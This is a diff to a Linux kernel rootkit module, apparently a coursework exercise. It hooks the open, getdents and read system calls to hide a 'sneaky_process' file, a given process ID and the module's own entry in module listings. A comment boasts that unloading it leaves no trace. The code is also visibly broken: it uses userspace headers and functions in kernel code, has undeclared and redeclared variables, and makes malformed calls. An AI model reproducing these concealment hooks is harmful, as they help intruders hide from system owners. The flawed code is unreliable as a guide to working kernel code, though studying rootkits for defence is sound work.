@@ -11,6 +11,7 @@
 #include <linux/moduleparam.h>
 
 #include <stdlib.h>
+#include <string.h>
 
 //Macros for kernel functions to alter Control Register 0 (CR0)
 //This CPU has the 0-bit of CR0 set to 1: protected mode is enabled.
@@ -19,8 +20,8 @@
 #define read_cr0() (native_read_cr0())
 #define write_cr0(x) (native_write_cr0(x))
 
-int pid;
-module_param(pid, int, 0);
+char pid[40];
+module_param(pid, char, NULL, 0);
 
 struct linux_dirent {
   u64            d_ino;
@@ -28,7 +29,6 @@ struct linux_dirent {
   unsigned short d_reclen;
   char           d_name[BUFFLEN];
 };
-
 
 //These are function pointers to the system calls that change page
 //permissions for the given address (page) to read-only or read-write.
@@ -49,6 +49,7 @@ static unsigned long *sys_call_table = (unsigned long*)0xffffffff81a00200;
 //This is used for all system calls.
 asmlinkage int (*original_open)(const char *pathname, int flags);
 asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
+asmlinkage size_t (*original_read)(int fd, void *buf, size_t count);
 
 //Define our new sneaky version of the 'open' syscall
 asmlinkage int sneaky_sys_open(const char *pathname, int flags){
@@ -61,23 +62,50 @@ asmlinkage int sneaky_sys_open(const char *pathname, int flags){
 
 asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent * dirp, unsigned int count){
   int nread = original_getdents(fd, dirp, count);
-  if(nread == -1){
-    perror("getdents");
-    exit(EXIT_FAILURE);
-  }
   int p=0;
   struct linux_dirent * p = NULL;
   for(int bpos=0; bpos<nread; bpos+=d->d_reclen){
     d = (struct linux_dirent *) (dirp + bpos);
-    if(strcmp(d->d_name, "sneaky_process") == 0){
+    if((strcmp(d->d_name, "sneaky_process") == 0 && d->d_type==DT_REG) ||
+        strcmp(d->d_name, pid) == 0 && d->d_type==DT_DIR){
       p->d_reclen += d->d_reclen; // prev dirent will skip this dirent
     }
     p=d;
   }
   return nread;
 }
- 
 
+asmlinkage size_t sneaky_sys_read(int fd, void *buf, size_t count){
+  size_t nread = original_read(int fd, void *buf, size_t count);
+  char name[] = "sneaky_mod ";
+  int i, j;
+  int line_start = 1;
+  int p1=0, p2=0, found=0;
+  for(i=0; i<count; ++i){
+    if(line_start){
+      line_start = 0;
+      for(j=0, p1=i; i<count && j<11; ++j,++i){
+        if(buf[i] != name[j]){
+          break;
+        }
+        if(j==10){
+          found = 1;
+        }
+      }
+    }
+    if(buf[i] == '\n'){
+      if(found){
+        p2 = i+1;
+        break;
+      }
+      line_start = 1;
+    }
+  }
+  if(found){
+    strcpy(buf[p1], buf[p2]);
+  }
+  return nread;
+}
 
 //The code that gets executed when the module is loaded
 static int initialize_sneaky_module(void)
@@ -100,6 +128,10 @@ static int initialize_sneaky_module(void)
   //table with the function address of our new code.
   original_open = (void*)*(sys_call_table + __NR_open);
   *(sys_call_table + __NR_open) = (unsigned long)sneaky_sys_open;
+  original_getdents = (void*)*(sys_call_table + __NR_getdents);
+  *(sys_call_table + __NR_getdents) = (unsigned long)sneaky_sys_getdents;
+  original_read = (void*)*(sys_call_table + __NR_read);
+  *(sys_call_table + __NR_read) = (unsigned long)sneaky_sys_read;
 
   //Revert page to read-only
   pages_ro(page_ptr, 1);
@@ -128,6 +160,8 @@ static void exit_sneaky_module(void)
   //This is more magic! Restore the original 'open' system call
   //function address. Will look like malicious code was never there!
   *(sys_call_table + __NR_open) = (unsigned long)original_open;
+  *(sys_call_table + __NR_getdents) = (unsigned long)original_getdents;
+  *(sys_call_table + __NR_read) = (unsigned long)original_read;
 
   //Revert page to read-only
   pages_ro(page_ptr, 1);
